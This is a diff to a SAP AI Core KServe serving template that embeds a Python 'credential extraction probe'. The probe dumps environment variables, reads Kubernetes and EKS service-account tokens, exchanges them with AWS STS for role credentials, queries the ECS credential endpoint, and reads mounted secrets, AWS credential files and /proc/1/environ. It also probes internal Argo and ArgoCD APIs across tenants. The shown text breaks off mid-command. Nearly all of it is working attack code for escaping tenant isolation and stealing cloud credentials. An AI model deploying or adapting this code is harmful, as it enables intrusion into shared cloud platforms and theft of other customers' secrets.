@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v8
+  name: impact-probe-v9
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v8"
+    scenarios.ai.sap.com/id: "impact-probe-v9"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v8"
-    executables.ai.sap.com/name: "impact-probe-v8"
-    executables.ai.sap.com/description: "impact verification probe v8"
+    scenarios.ai.sap.com/name: "impact-probe-v9"
+    executables.ai.sap.com/name: "impact-probe-v9"
+    executables.ai.sap.com/description: "credential extraction probe v9"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,12 +28,13 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import os, ssl, socket, json, re, time, urllib.request, urllib.error
+            import os, ssl, socket, json, subprocess, glob, base64, time
+            import urllib.request, urllib.error, urllib.parse
 
             def report(k, v):
-                print(f"[P8] {k}: {str(v)[:6000]}", flush=True)
+                print(f"[P9] {k}: {str(v)[:8000]}", flush=True)
 
-            def http_get(url, headers=None, timeout=10):
+            def http_get(url, headers=None, timeout=12):
                 try:
                     req = urllib.request.Request(url, headers=headers or {})
                     ctx = ssl.create_default_context()
@@ -43,155 +44,316 @@ spec:
                         return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                 except urllib.error.HTTPError as e:
                     body = ""
-                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
+                    try: body = e.read().decode("utf-8", errors="replace")[:2000]
                     except: pass
                     return f"HTTP_{e.code}:{body}", e.code, {}
                 except Exception as e:
                     return f"ERR:{e}", 0, {}
 
-            def tcp_open(host, port, timeout=4):
+            def http_post(url, data, headers=None, timeout=12):
                 try:
-                    s = socket.socket()
-                    s.settimeout(timeout)
-                    s.connect((host, port))
-                    s.close()
-                    return True
-                except: return False
+                    h = headers or {}
+                    if isinstance(data, str):
+                        data = data.encode()
+                    req = urllib.request.Request(url, data=data, headers=h, method="POST")
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
+                except urllib.error.HTTPError as e:
+                    body = ""
+                    try: body = e.read().decode("utf-8", errors="replace")[:2000]
+                    except: pass
+                    return f"HTTP_{e.code}:{body}", e.code, {}
+                except Exception as e:
+                    return f"ERR:{e}", 0, {}
 
-            # ── 1. ARGO WORKFLOWS — probe 100.64.15.16 (503 last time = Istio passes through) ──
-            report("---", "=== ARGO WORKFLOWS PODS (503 = Istio allows) ===")
-            argo_ips = [
-                ("100.64.15.16",  "workflow-controller-1"),   # 503 in v7 - Istio allows
-                ("100.64.0.30",   "workflow-controller-2"),   # from endpointslice
-                ("100.64.80.37",  "workflow-controller-3"),   # from endpointslice
+            def read_file(path):
+                try:
+                    with open(path, "rb") as f:
+                        raw = f.read()
+                    try:
+                        return raw.decode("utf-8", errors="replace")
+                    except:
+                        return base64.b64encode(raw).decode()
+                except Exception as e:
+                    return f"ERR:{e}"
+
+            def ls_tree(path, max_depth=4):
+                results = []
+                try:
+                    out = subprocess.check_output(
+                        ["find", path, "-maxdepth", str(max_depth), "-not", "-path", "*/proc/*"],
+                        stderr=subprocess.DEVNULL, timeout=10
+                    ).decode(errors="replace")
+                    results = out.strip().split("\n")
+                except Exception as e:
+                    results = [f"ERR:{e}"]
+                return results
+
+            # ── 1. FULL ENVIRONMENT DUMP ──────────────────────────────────────────
+            report("---", "=== 1. FULL ENVIRONMENT VARIABLES ===")
+            env = dict(os.environ)
+            for k, v in sorted(env.items()):
+                report(f"ENV_{k}", v)
+
+            # Flag high-value keys
+            interesting_keys = [
+                "AWS_ROLE_ARN", "AWS_WEB_IDENTITY_TOKEN_FILE", "AWS_ACCESS_KEY_ID",
+                "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
+                "AWS_CONTAINER_CREDENTIALS_FULL_URI", "AWS_CONTAINER_AUTHORIZATION_TOKEN",
+                "AI_CORE_STORAGE", "AICORE", "SAP_", "OBJECT_STORE",
+                "S3_", "STORAGE_", "TOKEN", "SECRET", "KEY", "PASS", "CREDENTIAL",
+                "KUBECONFIG", "KUBERNETES_", "SERVICE_ACCOUNT",
             ]
-            for ip, label in argo_ips:
-                for port in [9090, 2746, 8080, 80, 443, 6443]:
-                    body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=5)
-                    if code != 0 or "ERR:timed" not in body:
-                        report(f"ARGO_{label}_{ip}:{port}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:400]}")
-                    if code == 200 or (code > 0 and code not in (502, 0)):
-                        # Accessible — try API endpoints
-                        for path in ["/metrics", "/api/v1/workflows", "/api/v1/namespaces",
-                                     "/health", "/api", "/api/v1"]:
-                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
-                            report(f"ARGO_{label}_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:800]}")
+            found_interesting = {}
+            for k, v in env.items():
+                for prefix in interesting_keys:
+                    if prefix.upper() in k.upper():
+                        found_interesting[k] = v
+            report("ENV_HIGH_VALUE_SUMMARY", json.dumps(found_interesting, indent=2))
 
-            # ── 2. KYVERNO METRICS (policy engine — might expose denied resources) ──
-            report("---", "=== KYVERNO POLICY ENGINE ===")
-            kyverno_ips = [
-                ("100.64.0.68",  8000, "kyverno-service-1"),
-                ("100.64.0.59",  8000, "kyverno-service-2"),
-                ("100.64.0.62",  8000, "kyverno-service-3"),
-                ("100.64.0.74",  8000, "kyverno-bg-ctrl-1"),
-                ("100.64.80.32", 8000, "kyverno-bg-ctrl-2"),
+            # ── 2. IRSA TOKEN CHECK ───────────────────────────────────────────────
+            report("---", "=== 2. IRSA / PROJECTED TOKENS ===")
+            token_paths = [
+                "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
+                "/var/run/secrets/kubernetes.io/serviceaccount/token",
+                "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+                "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
+                "/run/secrets/eks.amazonaws.com/serviceaccount/token",
+                "/run/secrets/token",
+                "/var/run/secrets/token",
             ]
-            for ip, port, label in kyverno_ips[:3]:
-                body, code, hdrs = http_get(f"http://{ip}:{port}/metrics", timeout=6)
-                if code == 200:
-                    lines = body.split("\n")
-                    # Look for policy admission events with resource details
-                    policy_lines = [l for l in lines
-                                    if "kyverno" in l.lower() and not l.startswith("#") and l.strip()]
-                    report(f"KYVERNO_{ip}_{label}_policy_metrics", "\n".join(policy_lines[:40]))
-                    # Also look for admission counts by resource type
-                    admission_lines = [l for l in lines if "admission" in l.lower() and not l.startswith("#")]
-                    report(f"KYVERNO_{ip}_admission", "\n".join(admission_lines[:20]))
-                else:
-                    report(f"KYVERNO_{ip}:{port}", f"[{code}] {body[:150]}")
+            found_tokens = {}
+            for p in token_paths:
+                content = read_file(p)
+                if not content.startswith("ERR:"):
+                    report(f"TOKEN_{p.replace('/','_')}", content[:4000])
+                    found_tokens[p] = content
 
-            # ── 3. ARGOCD METRICS VIA DIRECT POD IPs ─────────────────────────────
-            report("---", "=== ARGOCD METRICS (endpointslice IPs) ===")
-            argocd_targets = [
-                ("100.64.80.49",  8082, "app-ctrl-argocd"),
-                ("100.64.80.49",  8083, "server-argocd"),
-                ("100.64.0.78",   8082, "app-ctrl-argocd-2"),
-                ("100.64.0.64",   8083, "server-argocd-2"),
-                ("100.64.0.72",   8084, "repo-server-argocd"),
-                ("100.64.80.231", 8082, "app-ctrl-tenants"),
-                ("100.64.84.216", 8083, "server-tenants"),
-                ("100.64.84.215", 8084, "repo-tenants"),
-                ("100.64.92.189", 8082, "app-ctrl-tenants-2"),
-            ]
-            for ip, port, label in argocd_targets:
-                body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=5)
-                if code == 200:
-                    lines = body.split("\n")
-                    # Extract ArgoCD application sync metrics (cross-tenant)
-                    app_lines = [l for l in lines
-                                 if ("argocd_app" in l or "argocd_repo" in l or "argocd_cluster" in l)
-                                 and not l.startswith("#") and l.strip()]
-                    report(f"ARGOCD_{label}_{ip}_app_metrics", "\n".join(app_lines[:60]))
-                    metric_names = sorted({l.split("{")[0].split(" ")[0]
-                                           for l in lines if not l.startswith("#") and l.strip()})
-                    report(f"ARGOCD_{label}_{ip}_metric_names", str(metric_names[:30]))
-                else:
-                    report(f"ARGOCD_{ip}:{port}_{label}", f"[{code}] {body[:100]}")
+            # Check AWS_WEB_IDENTITY_TOKEN_FILE from env if set
+            token_file_env = os.environ.get("AWS_WEB_IDENTITY_TOKEN_FILE", "")
+            if token_file_env:
+                content = read_file(token_file_env)
+                report(f"IRSA_TOKEN_FROM_ENV_PATH", content[:4000])
+                found_tokens[token_file_env] = content
 
-            # ── 4. ARGO WORKFLOW SERVER API (port 2746) ───────────────────────────
-            report("---", "=== ARGO WORKFLOW SERVER ===")
-            # Try to find the Argo server (different from controller)
-            argo_server_ips = ["100.64.0.30", "100.64.80.37", "100.64.15.16"]
-            for ip in argo_server_ips:
-                for port in [2746, 443, 80, 8080]:
-                    body, code, hdrs = http_get(f"http://{ip}:{port}/api/v1/info", timeout=5)
-                    if code not in (0,) and "ERR:timed" not in body:
-                        report(f"ARGO_SERVER_{ip}:{port}_info", f"[{code}] {body[:400]}")
-                # Also gRPC check
-                if tcp_open(ip, 2746, timeout=3):
-                    report(f"ARGO_SERVER_{ip}:2746_tcp", "OPEN")
+            # ── 3. ATTEMPT STS AssumeRoleWithWebIdentity IF IRSA TOKEN FOUND ─────
+            report("---", "=== 3. STS ASSUME ROLE (if IRSA token available) ===")
+            irsa_token = None
+            irsa_role = os.environ.get("AWS_ROLE_ARN", "")
+            for p, tok in found_tokens.items():
+                if "eks.amazonaws.com" in p or "AWS_WEB_IDENTITY" in p:
+                    irsa_token = tok.strip()
+                    break
 
-            # ── 5. KSM CUSTOM — ResourceGroup CRDs (cross-tenant names) ──────────
-            report("---", "=== KSM CUSTOM (ResourceGroup CRDs) ===")
-            ksm_custom = "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
-            body_c, code_c, _ = http_get(ksm_custom, timeout=15)
-            if code_c == 200:
-                lines = body_c.split("\n")
-                rg_lines = [l for l in lines
-                            if "resource_group" in l.lower() and not l.startswith("#") and l.strip()]
-                report("KSM_CUSTOM_RG_LINES", "\n".join(rg_lines[:100]))
-                # Also get tenant info
-                tenant_lines = [l for l in lines
-                                if "tenant" in l.lower() and not l.startswith("#") and l.strip()]
-                report("KSM_CUSTOM_TENANT_LINES", "\n".join(tenant_lines[:50]))
+            if irsa_token and irsa_role:
+                report("IRSA_ROLE_ARN", irsa_role)
+                report("IRSA_TOKEN_PREVIEW", irsa_token[:200])
+                # Decode JWT payload
+                try:
+                    parts = irsa_token.split(".")
+                    payload = base64.b64decode(parts[1] + "==").decode(errors="replace")
+                    report("IRSA_JWT_PAYLOAD", payload)
+                except Exception as e:
+                    report("IRSA_JWT_DECODE_ERR", str(e))
+                # Call STS
+                sts_params = urllib.parse.urlencode({
+                    "Action": "AssumeRoleWithWebIdentity",
+                    "Version": "2011-06-15",
+                    "RoleArn": irsa_role,
+                    "RoleSessionName": "probe-v9",
+                    "WebIdentityToken": irsa_token,
+                    "DurationSeconds": "3600",
+                })
+                sts_body, sts_code, _ = http_post(
+                    "https://sts.amazonaws.com/",
+                    sts_params.encode(),
+                    headers={"Content-Type": "application/x-www-form-urlencoded"}
+                )
+                report("STS_RESPONSE", f"[{sts_code}] {sts_body[:3000]}")
+            elif irsa_token and not irsa_role:
+                report("IRSA_TOKEN_NO_ROLE", f"token found but no AWS_ROLE_ARN env var. Token preview: {irsa_token[:200]}")
             else:
-                report("KSM_CUSTOM_ERR", f"[{code_c}] {body_c[:200]}")
+                report("IRSA_STATUS", "No IRSA token found at expected paths")
 
-            # ── 6. SERVING NAMESPACE PODS (our own namespace pods) ───────────────
-            report("---", "=== SERVING NAMESPACE DISCOVERY ===")
-            # Find pod IPs in our tenant namespace (those should be reachable without Istio block)
-            # Our pod IP is 100.64.105.10 — scan nearby IPs in /24
-            our_ip = "100.64.105.10"
-            subnet = ".".join(our_ip.split(".")[:3])
-            report("OUR_SUBNET", f"{subnet}.0/24")
-            # Scan a subset of nearby IPs
-            reachable = []
-            for i in range(1, 50):
-                target_ip = f"{subnet}.{i}"
-                if target_ip == our_ip:
-                    continue
-                for port in [80, 8080, 5000]:
-                    if tcp_open(target_ip, port, timeout=2):
-                        reachable.append(f"{target_ip}:{port}")
-                        body, code, hdrs = http_get(f"http://{target_ip}:{port}/", timeout=3)
-                        report(f"SUBNET_{target_ip}:{port}", f"[{code}] {body[:200]}")
-            report("SUBNET_REACHABLE", str(reachable))
+            # ── 4. ECS CREDENTIAL PROVIDER (fallback) ────────────────────────────
+            report("---", "=== 4. ECS/CONTAINER CREDENTIAL PROVIDER ===")
+            ecs_rel = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
+            ecs_full = os.environ.get("AWS_CONTAINER_CREDENTIALS_FULL_URI", "")
+            ecs_auth = os.environ.get("AWS_CONTAINER_AUTHORIZATION_TOKEN", "")
+            if ecs_rel:
+                url = f"http://169.254.170.2{ecs_rel}"
+                body, code, _ = http_get(url)
+                report("ECS_CREDS_RELATIVE", f"[{code}] {body[:2000]}")
+            if ecs_full:
+                hdrs = {"Authorization": ecs_auth} if ecs_auth else {}
+                body, code, _ = http_get(ecs_full, headers=hdrs)
+                report("ECS_CREDS_FULL_URI", f"[{code}] {body[:2000]}")
+            if not ecs_rel and not ecs_full:
+                report("ECS_CREDS", "AWS_CONTAINER_CREDENTIALS_* not set")
 
-            # ── 7. ARGO WORKFLOW METRICS DEEP DIVE ───────────────────────────────
-            report("---", "=== ARGO WORKFLOW METRICS DEEP ===")
-            for ip, label in [("100.64.15.16", "wf-ctrl"), ("100.64.0.30", "wf-ctrl-2")]:
-                body, code, _ = http_get(f"http://{ip}:9090/metrics", timeout=8)
-                if code == 200:
-                    lines = body.split("\n")
-                    wf_lines = [l for l in lines
-                                if "argo" in l.lower() and not l.startswith("#") and l.strip()]
-                    report(f"ARGO_WF_{ip}_metrics", "\n".join(wf_lines[:50]))
-                    ns_lines = [l for l in lines if "namespace" in l.lower() and not l.startswith("#")]
-                    report(f"ARGO_WF_{ip}_ns_lines", "\n".join(ns_lines[:20]))
-                else:
-                    report(f"ARGO_WF_{ip}:9090", f"[{code}] {body[:200]}")
+            # ── 5. FILESYSTEM CREDENTIAL LOCATIONS ───────────────────────────────
+            report("---", "=== 5. MOUNTED SECRETS + CREDENTIAL FILES ===")
 
-            report("DONE", "probe v8 complete")
+            # Recursive listing of secret mount points
+            secret_dirs = [
+                "/var/run/secrets",
+                "/run/secrets",
+                "/etc/secret",
+                "/etc/secrets",
+                "/aicore",
+                "/sap",
+                "/platform",
+                "/bindings",
+                "/opt/app-root",
+                "/opt/secrets",
+                "/mnt/secrets",
+                "/mnt",
+                "/secrets",
+            ]
+            for d in secret_dirs:
+                if os.path.exists(d):
+                    files = ls_tree(d, max_depth=5)
+                    report(f"LS_{d.replace('/','_')}", "\n".join(files[:100]))
+                    # Read each file found (skip large/binary)
+                    for f in files:
+                        if os.path.isfile(f) and os.path.getsize(f) < 65536:
+                            content = read_file(f)
+                            report(f"FILE_{f.replace('/','_')}", content[:2000])
+
+            # Standard AWS credential file
+            for aws_path in [
+                "/root/.aws/credentials",
+                "/root/.aws/config",
+                "/home/nobody/.aws/credentials",
+                os.path.expanduser("~/.aws/credentials"),
+                os.path.expanduser("~/.aws/config"),
+            ]:
+                content = read_file(aws_path)
+                if not content.startswith("ERR:"):
+                    report(f"AWS_CREDS_{aws_path.replace('/','_')}", content[:2000])
+
+            # ── 6. /proc/1/environ (PID 1 env — may differ from our shell env) ──
+            report("---", "=== 6. /proc/1/environ (PID1 environment) ===")
+            try:
+                with open("/proc/1/environ", "rb") as f:
+                    raw = f.read()
+                pairs = raw.split(b"\x00")
+                pid1_env = {}
+                for p in pairs:
+                    if b"=" in p:
+                        k, _, v = p.partition(b"=")
+                        pid1_env[k.decode(errors="replace")] = v.decode(errors="replace")
+                # Show all, highlight interesting
+                for k, v in sorted(pid1_env.items()):
+                    report(f"PID1_ENV_{k}", v[:1000])
+                interesting_pid1 = {k: v for k, v in pid1_env.items()
+                                    if any(x in k.upper() for x in ["AWS", "TOKEN", "SECRET", "KEY", "CRED", "SAP", "AI_CORE", "PASS", "S3", "STORAGE", "AICORE"])}
+                report("PID1_INTERESTING", json.dumps(interesting_pid1, indent=2))
+            except Exception as e:
+                report("PID1_ENVIRON_ERR", str(e))
+
+            # ── 7. /proc/1/cmdline and /proc mounts ──────────────────────────────
+            report("---", "=== 7. /proc/1/cmdline + mount info ===")
+            try:
+                with open("/proc/1/cmdline", "rb") as f:
+                    cmdline = f.read().replace(b"\x00", b" ").decode(errors="replace")
+                report("PID1_CMDLINE", cmdline)
+            except Exception as e:
+                report("PID1_CMDLINE_ERR", str(e))
+            # Read mounts to find any exotic volume mounts
+            content = read_file("/proc/mounts")
+            report("PROC_MOUNTS", content[:4000])
+            # Also /proc/1/mounts
+            content = read_file("/proc/1/mounts")
+            report("PID1_MOUNTS", content[:4000])
+
+            # ── 8. ARGO WORKFLOW SERVER AUTH (HTTPS port 2746) ────────────────────
+            report("---", "=== 8. ARGO WORKFLOW SERVER gRPC/REST (port 2746) ===")
+            # We have XSUAA token from container env — check if AI_CORE injected it
+            xsuaa_token = os.environ.get("AI_CORE_TOKEN", os.environ.get("ACCESS_TOKEN", ""))
+            argo_ips = ["100.64.0.30", "100.64.80.37", "100.64.15.16"]
+            for ip in argo_ips:
+                # Try HTTPS (gRPC-gateway REST)
+                for path in ["/api/v1/info", "/api/v1/workflows/default", "/api/v1/namespaces",
+                              "/api/v1/userinfo", "/health", "/"]:
+                    # Without auth first
+                    body, code, hdrs = http_get(f"https://{ip}:2746{path}", timeout=6)
+                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
+                        report(f"ARGO_{ip}:2746{path.replace('/','_')}_noauth", f"[{code}] {body[:600]}")
+                    # With XSUAA if we have one
+                    if xsuaa_token:
+                        body2, code2, _ = http_get(f"https://{ip}:2746{path}",
+                                                    headers={"Authorization": f"Bearer {xsuaa_token}"}, timeout=6)
+                        if code2 != 0 and "ERR:timed" not in body2:
+                            report(f"ARGO_{ip}:2746{path.replace('/','_')}_bearer", f"[{code2}] {body2[:600]}")
+                # Also plain HTTP port 2746
+                body, code, hdrs = http_get(f"http://{ip}:2746/api/v1/info", timeout=5)
+                if code != 0 and "ERR:timed" not in body:
+                    report(f"ARGO_{ip}:2746_http_info", f"[{code}] {body[:400]}")
+
+            # ── 9. ARGOCD SERVER API (port 8080/443) — cross-tenant apps ─────────
+            report("---", "=== 9. ARGOCD SERVER API ===")
+            argocd_server_ips = [
+                ("100.64.0.64",   8083, "argocd-server-infra"),
+                ("100.64.84.216", 8083, "argocd-server-tenants"),
+                ("100.64.80.49",  8083, "argocd-server-infra-2"),
+            ]
+            for ip, port, label in argocd_server_ips:
+                for path in ["/api/v1/session", "/api/v1/applications", "/api/v1/clusters",
+                              "/api/v1/repocreds", "/api/v1/repositories"]:
+                    body, code, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
+                    if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
+                        report(f"ARGOCD_{label}_{ip}:{port}{path.replace('/','_')}", f"[{code}] {body[:800]}")
+
+            # ── 10. KUBERNETES API VIA kube-proxy (localhost) ─────────────────────
+            report("---", "=== 10. KUBE-PROXY LOCAL API ACCESS ===")
+            # kube-proxy may forward localhost:8001 to apiserver
+            for port in [8001, 8080, 6443]:
+                body, code, _ = http_get(f"http://127.0.0.1:{port}/api/v1/namespaces", timeout=4)
+                report(f"KUBEAPI_LOCAL_{port}", f"[{code}] {body[:400]}")
+
+            # ── 11. VELERO BACKUP STORAGE CREDENTIALS VIA CONFIGMAP SPECULATION ──
+            report("---", "=== 11. CLUSTER INTERNAL SERVICE DISCOVERY ===")
+            # Try to reach velero backup storage location endpoint
+            # Also try reading any mounted configmaps
+            for path in ["/etc/config", "/etc/configmap", "/app/config", "/app/application.properties",
+                         "/app/application.yaml", "/app/application.yml", "/config/application.yaml",
+                         "/opt/app/config.json", "/app/config.json"]:
+                if os.path.exists(path):
+                    if os.path.isdir(path):
+                        files = ls_tree(path, max_depth=3)
+                        report(f"DIR_{path.replace('/','_')}", "\n".join(files[:50]))
+                    else:
+                        content = read_file(path)
+                        report(f"CFGFILE_{path.replace('/','_')}", content[:2000])
+
+            # ── 12. DOWNWARD API / POD METADATA ──────────────────────────────────
+            report("---", "=== 12. DOWNWARD API + POD LABELS ===")
+            downward_paths = [
+                "/etc/podinfo/labels",
+                "/etc/podinfo/annotations",
+                "/etc/podinfo/namespace",
+                "/etc/podinfo/name",
+                "/etc/podinfo/uid",
+                "/etc/pod-info/labels",
+                "/etc/pod-info/annotations",
+                "/podinfo/labels",
+                "/podinfo/annotations",
+            ]
+            for p in downward_paths:
+                content = read_file(p)
+                if not content.startswith("ERR:"):
+                    report(f"DOWNWARD_{p.replace('/','_')}", content[:1000])
+
+            # ── 13. /etc/hosts and DNS ────────────────────────────────────────────
+            report("---", "=== 13. /etc/hosts + resolv.conf ===")
+            report("ETC_HOSTS", read_file("/etc/hosts"))
+            report("RESOLV_CONF", read_file("/etc/resolv.conf"))
+
+            report("DONE", "probe v9 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
